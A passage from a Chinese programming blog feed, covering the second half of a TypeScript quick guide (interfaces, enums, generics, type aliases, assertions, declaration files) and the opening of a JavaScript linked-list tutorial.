&#123;</span><br><span class="line">      super(name, age);</span><br><span class="line">      this.name = name;</span><br><span class="line">      this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;`</span><br></pre></td></tr></table></figure><p>静态方法与属性：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> includes = [<span class="string">&quot;dog&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;bird&quot;</span>];</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">isAnimal</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">instanceof</span> <span class="title class_">Animal</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-interface-接口"><a href="#4-interface-接口" class="headerlink" title="4. interface 接口"></a>4. interface 接口</h1><p>定义与实现接口：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==== 定义接口 ====</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Radio</span> &#123;</span><br><span class="line">  <span class="title function_">switchRadio</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Battery</span> &#123;</span><br><span class="line">  <span class="title function_">checkBVatteryStatus</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">RadioWithBattery</span> <span class="keyword">extends</span> <span class="title class_">Radio</span> &#123; <span class="comment">// 接口的继承</span></span><br><span class="line">  <span class="title function_">checkBVatteryStatus</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==== 在类中实现接口 ====</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span> <span class="keyword">implements</span> <span class="title class_">Radio</span> &#123;</span><br><span class="line">  <span class="title function_">switchRadio</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone</span> <span class="keyword">implements</span> <span class="title class_">Radio</span>, <span class="title class_">Battery</span> &#123; <span class="comment">// 实现多个接口</span></span><br><span class="line">  <span class="title function_">switchRadio</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">checkBVatteryStatus</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CellPhone</span> <span class="keyword">implements</span> <span class="title class_">RadioWithBattery</span> &#123;</span><br><span class="line">  <span class="title function_">switchRadio</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="title function_">checkBVatteryStatus</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="5-enum-枚举"><a href="#5-enum-枚举" class="headerlink" title="5. enum 枚举"></a>5. enum 枚举</h1><p>定义与使用枚举类：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">  <span class="title class_">Up</span>,</span><br><span class="line">  <span class="title class_">Down</span>,</span><br><span class="line">  <span class="title class_">Left</span>,</span><br><span class="line">  <span class="title class_">Right</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Direction</span>.<span class="property">Up</span>); <span class="comment">// 0</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Direction</span>[<span class="number">0</span>]); <span class="comment">// &quot;Up&quot;</span></span><br></pre></td></tr></table></figure><p>之所以枚举类可以被双向引用，是因为上面的代码被编译为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Direction</span>;</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">Direction</span>) &#123;</span><br><span class="line">    <span class="title class_">Direction</span>[<span class="title class_">Direction</span>[<span class="string">&quot;Up&quot;</span>] = <span class="number">0</span>] = <span class="string">&quot;Up&quot;</span>;</span><br><span class="line">    <span class="title class_">Direction</span>[<span class="title class_">Direction</span>[<span class="string">&quot;Down&quot;</span>] = <span class="number">1</span>] = <span class="string">&quot;Down&quot;</span>;</span><br><span class="line">    <span class="title class_">Direction</span>[<span class="title class_">Direction</span>[<span class="string">&quot;Left&quot;</span>] = <span class="number">2</span>] = <span class="string">&quot;Left&quot;</span>;</span><br><span class="line">    <span class="title class_">Direction</span>[<span class="title class_">Direction</span>[<span class="string">&quot;Right&quot;</span>] = <span class="number">3</span>] = <span class="string">&quot;Right&quot;</span>;</span><br><span class="line">&#125;)(<span class="title class_">Direction</span> || (<span class="title class_">Direction</span> = &#123;&#125;));</span><br></pre></td></tr></table></figure><p>默认结构为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;Up&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;Down&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;Left&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;Right&#x27;</span>,</span><br><span class="line">  <span class="title class_">Up</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="title class_">Down</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="title class_">Left</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="title class_">Right</span>: <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外，枚举类还可以设置默认值：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">  <span class="title class_">Up</span> = <span class="string">&quot;UP&quot;</span>,</span><br><span class="line">  <span class="title class_">Down</span> = <span class="string">&quot;DOWN&quot;</span>,</span><br><span class="line">  <span class="title class_">Left</span> = <span class="string">&quot;LEFT&quot;</span>,</span><br><span class="line">  <span class="title class_">Right</span> = <span class="string">&quot;RIGHT&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Direction</span>.<span class="property">Up</span>); <span class="comment">// &quot;UP&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Direction</span>[<span class="string">&quot;Up&quot;</span>]); <span class="comment">// &quot;UP&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Direction</span>[<span class="number">0</span>]); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 应用于数据校验上</span></span><br><span class="line"><span class="keyword">let</span> result = <span class="string">&quot;UP&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (result !== <span class="title class_">Direction</span>.<span class="property">Up</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result error&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="6-泛型"><a href="#6-泛型" class="headerlink" title="6. 泛型"></a>6. 泛型</h1><p>泛型可以看作是一个占位符，在使用的时候动态填入确定的类型值。</p><h2 id="6-1-泛型的简单示例"><a href="#6-1-泛型的简单示例" class="headerlink" title="6.1 泛型的简单示例"></a>6.1 泛型的简单示例</h2><p>如果我们定义一个方法，这个方法传入任意类型且返回同样的类型，这样我们可能会将方法定义为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">echo</span>(<span class="params">arg: <span class="built_in">any</span></span>): <span class="built_in">any</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> str = <span class="title function_">echo</span>(<span class="string">&quot;wulalala&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="attr">num</span>: <span class="built_in">number</span> = <span class="title function_">echo</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> num); <span class="comment">// string  Bug:不符合预期的变量类型</span></span><br></pre></td></tr></table></figure><p>但是这样的话就缺少了类型校验，str 会被标为 any 类型，甚至还会出现 BUG。</p><p>为了避免这一情况，我们可以定义一个<strong>类型相同，但不对类型进行约束</strong>的变量类型 T ，我们将 T 称之为<strong>泛型</strong>：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> echo&lt;T&gt;(<span class="attr">arg</span>: T): T &#123;</span><br><span class="line">  <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> str = <span class="title function_">echo</span>(<span class="string">&quot;wulalala&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="attr">num</span>: <span class="built_in">number</span> = <span class="title function_">echo</span>(<span class="string">&quot;123&quot;</span>); <span class="comment">// error: 不能将类型 &quot;123&quot; 分配给类型 &quot;number&quot; (Bug fixed)</span></span><br></pre></td></tr></table></figure><p>此外，泛型还可以用于元组中：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> swap&lt;T, U&gt;(<span class="attr">tuple</span>: [T, U]): [U, T] &#123;</span><br><span class="line">  <span class="keyword">return</span> [tuple[<span class="number">1</span>], tuple[<span class="number">0</span>]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> result = <span class="title function_">swap</span>([<span class="string">&quot;string&quot;</span>, <span class="number">123</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// 123, &quot;string&quot;</span></span><br></pre></td></tr></table></figure><h2 id="6-2-泛型约束"><a href="#6-2-泛型约束" class="headerlink" title="6.2 泛型约束"></a>6.2 泛型约束</h2><p>假设现在我们有一个需求：传入一个具有 length 属性的对象，要求输出该对象的 length，同时返回与该对象同一类型的对象。</p><p>但是如果我们使用泛型的话，输出 length 时就会显示没有该属性：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> printLength&lt;T&gt;(<span class="attr">input</span>: T): T &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(input.<span class="property">length</span>); <span class="comment">// error: 类型“T”上不存在属性“length”。</span></span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，我们可以使用泛型约束，来约束泛型 T 为一个数组类型：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- function printLength&lt;T&gt;(input: T): T &#123;</span></span><br><span class="line"><span class="addition">+ function printLength&lt;T&gt;(input: T[]): T[] &#123;</span></span><br><span class="line">    console.log(input.length);</span><br><span class="line">    return input;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>但是这样的话就失去了泛型原有的作用，用户只能在该方法中传入数组。string 类型同样有 length 属性，但是将 string 传入该方法中的话就会报错。因此更好的做法是去定义一个接口类型，接口类型中拥有 length 属性，string 和 array 都符合接口的规范，我们可以让定义的泛型继承自该接口，那么我们的需求就达到了：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IinputWithLength</span> &#123;</span><br><span class="line">  <span class="attr">length</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> printLength&lt;T <span class="keyword">extends</span> <span class="title class_">IinputWithLength</span>&gt;(<span class="attr">input</span>: T): T &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(input.<span class="property">length</span>);</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">printLength</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="title function_">printLength</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="title function_">printLength</span>(&#123; <span class="attr">length</span>: <span class="number">10</span> &#125;);</span><br><span class="line"><span class="title function_">printLength</span>(<span class="number">123</span>); <span class="comment">// error: 类型“123”的参数不能赋给类型“IinputWithLength”的参数</span></span><br></pre></td></tr></table></figure><h2 id="6-3-类和接口的泛型"><a href="#6-3-类和接口的泛型" class="headerlink" title="6.3 类和接口的泛型"></a>6.3 类和接口的泛型</h2><p>在前面我们再方法中使用了泛型，那么同样的我们可以在类中也使用泛型：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span>&lt;T&gt; &#123;</span><br><span class="line">  <span class="keyword">private</span> data = [];</span><br><span class="line">  <span class="title function_">push</span>(<span class="params">item: T</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">data</span>.<span class="title function_">push</span>(item);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">pop</span>(): T &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">data</span>.<span class="title function_">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> queue = <span class="keyword">new</span> <span class="title class_">Queue</span>&lt;<span class="built_in">number</span>&gt;(); <span class="comment">// 在创建实例的时候要声明泛型的类型</span></span><br><span class="line">queue.<span class="title function_">push</span>(<span class="number">1.23</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(queue.<span class="title function_">pop</span>().<span class="title function_">toFixed</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">queue.<span class="title function_">push</span>(<span class="string">&quot;1.23&quot;</span>); <span class="comment">// error: 类型“&quot;1.23&quot;”的参数不能赋给类型“number”的参数。</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(queue.<span class="title function_">pop</span>().<span class="title function_">toFixed</span>(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>同样的接口也可以使用泛型：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用泛型定义接口对象</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">KeyPair</span>&lt;T, U&gt; &#123;</span><br><span class="line">  <span class="attr">key</span>: T;</span><br><span class="line">  <span class="attr">value</span>: U;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">kp1</span>: <span class="title class_">KeyPair</span>&lt;<span class="built_in">number</span>, <span class="built_in">string</span>&gt; = &#123;</span><br><span class="line">  <span class="attr">key</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">value</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用泛型定义接口函数</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IAdd</span>&lt;T&gt; &#123;</span><br><span class="line">  (<span class="attr">a</span>: T, <span class="attr">b</span>: T): T;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">a</span>: <span class="title class_">IAdd</span>&lt;<span class="built_in">number</span>&gt; = add;</span><br></pre></td></tr></table></figure><p>数组也可以使用泛型来定义：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">arr1</span>: <span class="built_in">number</span>[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="attr">arr2</span>: <span class="title class_">Array</span>&lt;<span class="built_in">number</span> | <span class="built_in">string</span>&gt; = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="string">&quot;2&quot;</span>];</span><br></pre></td></tr></table></figure><h1 id="7-类型别名与断言"><a href="#7-类型别名与断言" class="headerlink" title="7. 类型别名与断言"></a>7. 类型别名与断言</h1><h2 id="7-1-类型别名-Type-Aliases"><a href="#7-1-类型别名-Type-Aliases" class="headerlink" title="7.1 类型别名 Type Aliases"></a>7.1 类型别名 Type Aliases</h2><p>类型别名就是将联合类型或者是比较复杂的函数类型设置一个别名，可以提供给其他变量进行使用，对类型进行约束:</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">PluseType</span> = <span class="function">(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">a: <span class="built_in">number</span>, b: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="attr">fn</span>: <span class="title class_">PluseType</span> = sum;</span><br></pre></td></tr></table></figure><p>联合类型比较常用类型别名：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">NameResolver</span> = <span class="function">() =&gt;</span> <span class="built_in">string</span>;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">NameOrResolver</span> = <span class="built_in">string</span> | <span class="title class_">NameResolver</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params">arg: NameOrResolver</span>): <span class="built_in">string</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> arg === <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> arg;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">arg</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">getName</span>(<span class="string">&quot;huahua&quot;</span>)); <span class="comment">// huahua</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  <span class="title function_">getName</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;huahua2&quot;</span>;</span><br><span class="line">  &#125;)</span><br><span class="line">); <span class="comment">// huahua2</span></span><br></pre></td></tr></table></figure><h2 id="7-2-类型断言-Type-Assertion"><a href="#7-2-类型断言-Type-Assertion" class="headerlink" title="7.2 类型断言 Type Assertion"></a>7.2 类型断言 Type Assertion</h2><p>可以使用 <code>as</code> 关键字对变量类型进行断言，我们可以将断言后的结果赋值到任意变量上，那么通过这个变量就可以使用我们断言的类型上所拥有的方法：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getLength</span>(<span class="params">input: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> str = input <span class="keyword">as</span> <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">if</span> (str.<span class="property">length</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> str.<span class="property">length</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="built_in">number</span> = input <span class="keyword">as</span> <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">number</span>.<span class="title function_">toString</span>().<span class="property">length</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外，我们可以使用 <code>&lt;&gt;</code> 来更简洁的对变量进行断言并直接使用：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((&lt;<span class="built_in">string</span>&gt;input).<span class="property">length</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (&lt;<span class="built_in">string</span>&gt;input).<span class="property">length</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> (&lt;<span class="built_in">number</span>&gt;input).<span class="title function_">toString</span>().<span class="property">length</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>两种方式都可以使用 <code>()</code> 包裹住后直接调用类型上的方法，或者将其赋值到一个变量上，通过变量调用类型上的方法。</p></blockquote><p>#　8. 声明文件</p><p>假如我们要在项目中使用 jQuery 文件，那么可能会出现如下报错信息：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">jQuery</span>(<span class="string">&quot;#id&quot;</span>); <span class="comment">// error: 找不到名称“jQuery”。</span></span><br></pre></td></tr></table></figure><p>此时我们需要 jQuery 的声明文件来帮助我们声明这个方法。我们可以使用关键字 <code>declear</code> 来声明一种方法，让项目可以借助 ts 的能力来对原来使用 js 构建的库文件使用类型断言：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="keyword">var</span> <span class="attr">jQuery</span>: <span class="function">(<span class="params">selector: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">any</span>;</span><br><span class="line"><span class="title function_">jQuery</span>(<span class="string">&quot;#id&quot;</span>);</span><br></pre></td></tr></table></figure><p>通常我们可以使用 <code>d.ts</code> 文件作为专用的声明文件，这一文件将会被 ts 构建的时候被编译。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typescript </tag>
            
            <tag> 快速指南 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript数据结构：链表</title>
      <link href="/2020/05/596e5bd5f4cb.html"/>
      <url>/2020/05/596e5bd5f4cb.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-概论"><a href="#1-概论" class="headerlink" title="1. 概论"></a>1. 概论</h1><h2 id="1-1-链表与数组的区别"><a href="#1-1-链表与数组的区别" class="headerlink" title="1.1 链表与数组的区别"></a>1.1 链表与数组的区别</h2><p>存储多个元素来说，链表与数组都是很好的选择。Javascript 也内置的数组对象（小知识：Javascript 第一个版本中没有数组对象），并且定义了很多的操作方法。<strong>但是数组也有很多的不足，对于数组来说，从数组的起点或中间插入或移除项目的成本很高，因为要移动元素</strong>。然而对于链表而言，插入元素或者删除元素只需要移动链的指向即可，成本相对较低。然而但对于单纯的访问元素来说，数组可以直接通过索引坐标来访问，而链表要想访问一个数组则需要从头结点（Head）开始访问到最后。</p><h2 id="1-2-链表的结构"><a href="#1-2-链表的结构" class="headerlink" title="1.2 链表的结构"></a>1.2 链表的结构</h2><p>链表通常由一个 Head 节点开始，链中的每个节点都有一个 value 存放节点的值，以及一个 next 指针来指向下一个节点，直到最后一个节点的 next 指向 null。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200514172551.png" alt=""></p><h1 id="2-实现"><a href="#2-实现" class="headerlink" title="2. 实现"></a>2. 实现</h1><p>链表在 Javascript 中并没有一个内置的实现，因此需要我们手动实现。</p><h2 id="2-1-节点的构建"><a href="#2-1-节点的构建" class="headerlink" title="2.1 节点的构建"></a>2.1 节点的构建</h2><p>节点是链表中的基本单位，一个节点包含当前节点的值，以及一个 next 指针指向下一个节点对象，我们可以构建为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">value</span> = value;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">next</span> = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> node = <span class="keyword">new</span> <span class="title class_">Node</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>我们就构建好了一个基本节点：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200514173244.png" alt=""></p><h2 id="2-2-链表结构的构建"><a href="#2-2-链表结构的构建" class="headerlink" 